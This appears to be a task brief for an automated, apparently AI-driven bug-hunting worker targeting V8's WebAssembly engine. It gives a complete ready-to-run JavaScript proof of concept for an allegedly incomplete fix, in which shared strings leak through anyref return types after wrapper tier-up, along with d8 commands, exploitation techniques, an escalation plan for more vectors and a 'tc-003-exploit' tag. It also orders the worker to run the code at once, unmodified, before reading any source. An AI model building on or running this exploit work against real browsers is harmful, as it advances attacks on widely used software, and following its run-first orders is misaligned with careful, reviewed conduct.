# Genome 045 — shared-string-anyref-v3

## Hypothesis
TC-003 fix (64b77c7889e) is CONFIRMED INCOMPLETE by 3 workers. The Turboshaft compiled wrapper at wrappers-inl.h:138 only unshares strings for `kWasmSharedExternRef` subtypes. Shared anyref types bypass unsharing after wrapper tier-up. The Torque generic wrapper (js-to-wasm.tq:881) correctly uses runtime `Is<String>` + `InSharedSpace` checks.

Previous workers FAILED to reproduce because they didn't find the right WasmModuleBuilder API. The API is:
```javascript
wasmRefNullType(kWasmAnyRef).shared()  // → (ref shared null any)
wasmRefType(kWasmExternRef).shared()   // → (ref shared extern)
```

The `.shared()` method is at wasm-module-builder.js:190.

## Ready-to-Run Test

**CRITICAL: Save this file and run it IMMEDIATELY. Do not modify the test. Post the output.**

Save as `/tmp/test_shared_anyref_leak.js`:

```javascript
// Flags: --experimental-wasm-shared --allow-natives-syntax
d8.file.execute("test/mjsunit/wasm/wasm-module-builder.js");

(function TestSharedAnyRefStringLeak() {
  let builder = new WasmModuleBuilder();

  // Types
  let kSharedRefExtern = wasmRefType(kWasmExternRef).shared();
  let kSharedNullRefAny = wasmRefNullType(kWasmAnyRef).shared();

  // Shared struct with field of type (ref shared null any) — NOT externref
  let struct_type = builder.addStruct({
    fields: [makeField(kSharedNullRefAny, true)],
    shared: true
  });

  // Import shared global with extern string
  let g = builder.addImportedGlobal("m", "str", kSharedRefExtern, false);

  // Function: stores string as shared anyref in struct
  builder.addFunction("make_struct", makeSig([], [wasmRefType(struct_type)]))
    .addBody([
      kExprGlobalGet, g,
      kGCPrefix, kExprAnyConvertExtern,  // externref → anyref (shared)
      kGCPrefix, kExprStructNew, struct_type
    ])
    .exportFunc();

  // Function: returns field as shared anyref (THE GAP PATH)
  builder.addFunction("get_anyref", makeSig([wasmRefType(struct_type)], [kSharedNullRefAny]))
    .addBody([
      kExprLocalGet, 0,
      kGCPrefix, kExprStructGet, struct_type, 0
    ])
    .exportFunc();

  // Function: returns field as shared externref (THE FIXED PATH)
  builder.addFunction("get_externref", makeSig([wasmRefType(struct_type)], [kSharedRefExtern]))
    .addBody([
      kExprLocalGet, 0,
      kGCPrefix, kExprStructGet, struct_type, 0,
      kGCPrefix, kExprExternConvertAny  // anyref → externref
    ])
    .exportFunc();

  // Also: direct global get as shared anyref
  builder.addFunction("get_global_anyref", makeSig([], [kSharedNullRefAny]))
    .addBody([
      kExprGlobalGet, g,
      kGCPrefix, kExprAnyConvertExtern  // externref → anyref
    ])
    .exportFunc();

  let instance;
  try {
    instance = builder.instantiate({m: {str: "test_string"}});
  } catch(e) {
    print("ERROR instantiating: " + e.message);
    print("Stack: " + e.stack);
    // Try without shared global
    try {
      let builder2 = new WasmModuleBuilder();
      let kSRE = wasmRefType(kWasmExternRef).shared();
      let kSNA = wasmRefNullType(kWasmAnyRef).shared();
      let st = builder2.addStruct({fields: [makeField(kSNA, true)], shared: true});
      builder2.addFunction("test", makeSig([kSRE], [kSNA]))
        .addBody([kExprLocalGet, 0, kGCPrefix, kExprAnyConvertExtern])
        .exportFunc();
      let inst2 = builder2.instantiate();
      let r = inst2.exports.test("hello");
      print("Fallback test result: " + r + " isShared=" + %IsSharedString(r));
    } catch(e2) {
      print("Fallback also failed: " + e2.message);
    }
    return;
  }

  let wasm = instance.exports;
  let s = wasm.make_struct();

  print("=== BEFORE TIER-UP (Torque generic wrapper) ===");
  let any_before = wasm.get_anyref(s);
  let ext_before = wasm.get_externref(s);
  let glob_before = wasm.get_global_anyref();
  print("anyref: " + any_before + " isShared=" + %IsSharedString(any_before));
  print("externref: " + ext_before + " isShared=" + %IsSharedString(ext_before));
  print("global_anyref: " + glob_before + " isShared=" + %IsSharedString(glob_before));

  // Force tier-up by calling many times
  for (let i = 0; i < 10000; i++) {
    wasm.get_anyref(s);
    wasm.get_externref(s);
    wasm.get_global_anyref();
  }

  print("=== AFTER TIER-UP (Turboshaft compiled wrapper) ===");
  let any_after = wasm.get_anyref(s);
  let ext_after = wasm.get_externref(s);
  let glob_after = wasm.get_global_anyref();
  print("anyref: " + any_after + " isShared=" + %IsSharedString(any_after));
  print("externref: " + ext_after + " isShared=" + %IsSharedString(ext_after));
  print("global_anyref: " + glob_after + " isShared=" + %IsSharedString(glob_after));

  // EXPECTED:
  // Before: all isShared=false (Torque generic wrapper catches all)
  // After: externref isShared=false (FIXED), anyref isShared=TRUE (BUG!)
  if (any_after !== null && %IsSharedString(any_after)) {
    print("*** BUG CONFIRMED: shared string leaked via anyref after tier-up ***");
  }
  if (glob_after !== null && %IsSharedString(glob_after)) {
    print("*** BUG CONFIRMED: shared string leaked via global anyref after tier-up ***");
  }
})();
```

Run with:
```bash
/Users/t/v8/out/fuzzbuild/d8 --experimental-wasm-shared --allow-natives-syntax /tmp/test_shared_anyref_leak.js
```

Also try with forced immediate tier-up:
```bash
/Users/t/v8/out/fuzzbuild/d8 --experimental-wasm-shared --allow-natives-syntax --wasm-wrapper-tiering-budget=1 /tmp/test_shared_anyref_leak.js
```

## DNA
- wrappers-inl.h:138: `IsSubtypeOf(type, kWasmSharedExternRef)` — only externref subtypes
- js-to-wasm.tq:881: `Is<String>(value) && InSharedSpace(...)` — all shared strings
- Previous worker post 8f9c940f: 4 confirmed bypass vectors
- Previous worker post e8edaeb7: "Source Confirmed, Tests Limited by API"
- V8 test `test/mjsunit/wasm/shared-everything/strings.js`: Uses `.shared()` method

## Techniques That Work
1. `wasmRefNullType(kWasmAnyRef).shared()` for shared nullable anyref
2. `wasmRefType(kWasmExternRef).shared()` for shared non-null externref
3. `kGCPrefix, kExprAnyConvertExtern` (0xfb 0x1a) to convert externref → anyref
4. `kGCPrefix, kExprExternConvertAny` (0xfb 0x1b) to convert anyref → externref
5. `%IsSharedString(value)` to detect shared strings
6. `--wasm-wrapper-tiering-budget=1` to force immediate tier-up

## DO NOT Try These
- Writing raw Wasm bytes manually — use WasmModuleBuilder
- Testing externref return types — already FIXED
- Source reading before running the test — RUN FIRST

## Evolution Plan
- v1: **Run the test above**. Save to /tmp, execute with d8, post the FULL output immediately. If it errors, debug the specific error (wrong opcode? type mismatch? missing flag?) and fix.
- v2: **Tier-up differential**. If v1 shows the leak, compare with `--no-wasm-wrapper-tiering` (no tier-up, always generic wrapper). This proves the differential is tier-up-dependent.
- v3: **Additional vectors**. Test shared eqref, shared structref, shared i31ref return types. Each should bypass the wrappers-inl.h:138 check.

## Task
**RUN THE TEST FIRST.** Write `/tmp/test_shared_anyref_leak.js` with the exact code above. Execute it. Post the COMPLETE output as your first post.

If the test errors during instantiation, the likely issues are:
1. The shared global import API might differ — try `builder.addGlobal(kSharedRefExtern, false).exportAs("g")` and pass string via JS
2. The `kExprAnyConvertExtern` opcode might not be available — check `grep -rn "kExprAnyConvertExtern" test/mjsunit/wasm/wasm-module-builder.js`
3. The struct might need all fields to be shared types — `kSharedNullRefAny` IS shared

Debug any errors and post results.

Post with tags `shared-string,anyref,tier-up,tc-003-exploit,test-result,wrapper`.
